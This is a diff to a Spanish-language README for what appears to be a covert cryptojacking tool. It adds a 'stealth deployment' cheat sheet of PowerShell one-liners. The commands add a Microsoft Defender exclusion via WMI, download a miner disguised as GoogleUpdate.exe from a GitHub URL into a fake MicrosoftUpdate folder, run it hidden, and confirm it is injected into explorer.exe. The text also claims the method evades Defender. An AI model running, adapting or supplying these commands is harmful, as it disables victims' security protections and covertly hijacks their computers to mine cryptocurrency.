@@ -99,3 +99,38 @@ Entra en el dashboard de Hashvault con tu wallet. El PC aparecerá con su **Nomb
 
 > [!IMPORTANT]
 > El proyecto se encuentra en Fase de Producción. La arquitectura ha demostrado ser capaz de evadir la protección en tiempo real de Microsoft Defender (v4.18+) siempre que se siga el protocolo de exclusión por WMI antes de la descarga.
+
+---
+
+## 7. Apéndice: Comandos de Operación Rápida (Cheat Sheet)
+
+Sección añadida tras verificación exitosa en laboratorio.
+
+### 7.1 Protocolo de Despliegue Sigiloso (Uno-Lineros)
+
+**Fase 1: Preparación y Exclusión (Admin)**
+```powershell
+$p="C:\ProgramData\MicrosoftUpdate"; if(!(Test-Path $p)){ni $p -Type Directory -Force}; Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath = [string[]]("$p")}
+```
+
+**Fase 2: Transferencia de Payload**
+```powershell
+$u="https://raw.githubusercontent.com/AlmightyDaemon/miner.exe/refs/heads/main/GoogleUpdate.exe"; (New-Object Net.WebClient).DownloadFile($u,"C:\ProgramData\MicrosoftUpdate\GoogleUpdate.exe")
+```
+
+**Fase 3: Ejecución en Memoria**
+```powershell
+Start-Process "C:\ProgramData\MicrosoftUpdate\GoogleUpdate.exe" -WindowStyle Hidden
+```
+
+### 7.2 Comandos de Verificación Post-Despliegue
+
+**Chequeo de Conexión al Pool (Inyectado en Explorer)**
+```powershell
+Get-NetTCPConnection -State Established | Where-Object { $_.RemotePort -eq 443 } | Select-Object @{n="Proceso";e={(Get-Process -Id $_.OwningProcess).Name}}, RemoteAddress | Where-Object { $_.Proceso -eq "explorer" }
+```
+
+**Monitorización de carga de CPU (Impacto Real)**
+```powershell
+Get-Counter "\Process(explorer*)\% Processor Time" | Select-Object -ExpandProperty CounterSamples | Where-Object { $_.CookedValue -gt 0.1 } | Select-Object @{n="Proceso";e={$_.InstanceName}}, @{n="CPU_Uso(%)";e={[math]::Round($_.CookedValue / $env:NUMBER_OF_PROCESSORS, 2)}}
+```
